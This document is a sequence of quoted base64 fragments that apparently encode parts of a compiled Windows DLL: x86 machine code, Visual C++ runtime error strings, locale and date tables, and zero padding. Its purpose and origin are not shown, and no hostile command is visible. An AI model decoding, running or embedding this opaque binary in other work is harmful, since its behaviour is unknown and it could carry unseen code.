vGXl3CCACLxl/GBAgAXl3CCACF0nREg34UEHIEiwbrAovGK/pTjRwIi8crwXQOUI0EE1BT6Fo7AACDxAyDfhQQiX4QW3IOiwbGBDgAX4vGXl3CCACLxsYEOABfi8ZeXcIIAGhIQwEQ6NI6AADMzMzMzMzMVYvsav9ocOYAEGShAAAAAFCD7AxTVlehwHABEDPFUI1F9GSjAAAAAIll8IvxiXXoi0UIi/iDzw+D//52BIv46yeLXhS4q6qqqvfni8vR6dHqO8p2E7j+////K8GNPBk72HYFv/7///+NTwEzwMdF/AAAAACJReyFyXRGg/n/dxBR6JJCAACDxASJReyFwHUx6Nc5AACLRQiJRexAiWXwUI1NC8ZF','AG0AZQAgAGUAcgByAG8AcgAgAAAAAAACAAAAYAkBEAgAAAAgAAEQCQAAAHgAARAKAAAA0AABEBAAAAAYAQEQEQAAAHABARASAAAA0AEBEBMAAAAYAgEQGAAAAHACARAZAAAA4AIBEBoAAAAwAwEQGwAAAKADARAcAAAAEAQBEB4AAABcBAEQHwAAAKAEARAgAAAAaAUBECEAAADQBQEQIgAAAMAHARB4AAAAKAgBEHkAAABICAEQegAAAGQIARD8AAAAgAgBEP8AAACICAEQUgA2ADAAMAAyAA0ACgAtACAAZgBsAG8AYQB0AGkAbgBnACAAcABvAGkAbgB0ACAAcwB1AHAAcABvAHIAdAAgAG4AbwB0ACAAbABvAGEAZABlAGQADQAKAAAAAABSAHUAbgB0AGkAbQBlACAARQByAHIAbwByACEACgAKAFAAcgBvAGcAcgBhAG0AOgAgAAAAPABwAHIAbwBnAHIAYQBtACAAbgBhAG0AZQAgAHUAbgBrAG4AbwB3AG4APgAAAAAALgAuAC4AAAAKAAoAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAVgBpAHMAdQBhAGwAIABDACsAKwAgAFIAdQBuAHQAaQBtAGUAIABMAGkAYgByAGEAcgB5AAAAAACMCgEQmAoBEKQKARCwCgEQagBhAC0ASgBQAAAAegBoAC0AQwBOAAAAawBvAC0ASwBSAAAAegBoAC0AVABXAAAAU3VuAE1vbgBUdWUAV2VkAFRodQBGcmkAU2F0AFN1bmRheQAATW9uZGF5AABUdWVzZGF5AFdlZG5lc2RheQAAAFRodXJzZGF5AAAAAEZyaWRheQAAU2F0dXJkYXkAAAAASmFuAEZlYgBNYXIAQXByAE1heQBKdW4ASnVsAEF1ZwBTZXAAT2N0AE5vdgBEZWMASmFudWFyeQBGZWJydWFyeQAAAABNYXJjaAAAAEFwcmlsAAAASnVuZQAAAABKdWx5AAAAAEF1Z3VzdAAAU2VwdGVtYmVyAAAAT2N0b2JlcgBOb3ZlbWJlcgAAAABEZWNlbWJlcgAAAABBTQAAUE0AAE1NL2RkL3l5AAAAAGRkZ','NzYWdlX3NpemUAAAAAZmlsZW5hbWVfdG9vX2xvbmcAAABuZXR3b3JrX2Rvd24AAAAAbmV0d29ya19yZXNldAAAAG5ldHdvcmtfdW5yZWFjaGFibGUAbm9fYnVmZmVyX3NwYWNlAG5vX3Byb3RvY29sX29wdGlvbgAAbm90X2Nvbm5lY3RlZAAAAG5vdF9hX3NvY2tldAAAAABvcGVyYXRpb25fbm90X3N1cHBvcnRlZABwcm90b2NvbF9ub3Rfc3VwcG9ydGVkAAB3cm9uZ19wcm90b2N','otFwItNyI0EgI08gWoI6EsOAACDxASFwHQdiXAExwAAAAAAi09Uhcl1BYlHUOsCiQH/R0yJR1SD+xBzIYtNzI0Em40MgYtBbIXAdAWLAIlBbItxbIX2dAWLdgTrAjP2hfZ1qYt9zItFwI0EgMdEh1QAAAAAx0SHUAAAAADHRIdYAAAAAMdEh0wAAAAAD7dF1ItNvIt9xJkDyBFVtOk//v//i0XE6wKLx4tN9GSJDQAAAABZX15bi03wM83oiAUAAIvlXcIIAFWL7Gr/aDjnABBkoQAAAABQg+wMVqHAcAEQM8VQjUX0ZKMAAAAAi/GJdez/dQz/dQjoCs3//8dF/AAAAACDfjQAxwacQwEQx0ZQ/////8dGVP////90cYtOHItBMIlGQItBNIlGRItGBIB4CAB0Iv92DOgCBQAAiUZIg8QEi8aLTfRkiQ0AAAAAWV6L5V3CCAD/dkDo4AQAAIPEBI1NDFH/dkCJRkhQjUXoD1fAUIvOZg8TRejoFtL//4XAdBiLRQw7RkB0F+sOx0ZAAAAAAMdGRAAAAADHRkgAAAAAi8aLTfRkiQ0AAAAAWV6L5V3CCADMzMzMzMzMzMzMzMzMzMxVi+xq/2ho5wAQZKEAAAAAUFFWV6HAcAEQM8VQjUX0ZKMAAAAAi/mJffCLdQiLVQzHB/hEARCJdwSJVxiLQghmi0AIZolHCItCCItADIlHDItCCItAFIlHEItCCItAIIlHFMcH5EQBEIl3HA+3RhQDxolHIItGEIlHJMdF/AAAAADHB4hDARDHRzj/////x0c8/////4lHKMdHLAAAAACAfggAdBD/dwzozAMAAIPEBIlHMOs8UOi+AwAAi1cog8QEM/aJRzCF0nQbi08khcl0GYvyO9EPR/FW/3cgUOgeFgAAg8QMO3codAfHRzAAAAAAi8eLTfRkiQ0AAAAAWV9ei+VdwggAzMzMzMzMzMzMzFWL7Gr/aLjoABBkoQAAAABQUVZXocBwARAzxVCNRfRkowAAAACL+Yl98McHxEMBEI1PPMdF/AAAAADHAQBEARDoy/X///93OMcH0EQBEOjlCgAAg8QEjU8g6CL2//+NTyDHRyAQRAEQ6BP2///2RQgBxwf4RAEQdAlX6LkKAACDxASLx4tN9GSJDQAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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','AAAAAAAAAAAAAAAAAAAAAAAAAAAAIAWTGQAAAAAAAAAAAAAAAP7///8AAAAAAAAAAAAAAACk/wAQAAAAAC4/QVZfSW9zdHJlYW1fZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAKT/ABAAAAAALj9BVl9TeXN0ZW1fZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAAAApP8AEAAAAAAuP0FWZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAAAApP8AEAAAAAAuP0FWX0dlbmVyaWNfZXJyb3JfY2F0ZWdvcnlAc3RkQEAAAACk/wAQAAA','AtAG4AbwAAAAAAcwBtAGEALQBzAGUAAAAAAHMAbQBqAC0AbgBvAAAAAABzAG0AagAtAHMAZQAAAAAAcwBtAG4ALQBmAGkAAAAAAHMAbQBzAC0AZgBpAAAAAABzAHEALQBhAGwAAABzAHIALQBiAGEALQBjAHkAcgBsAAAAAABzAH','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN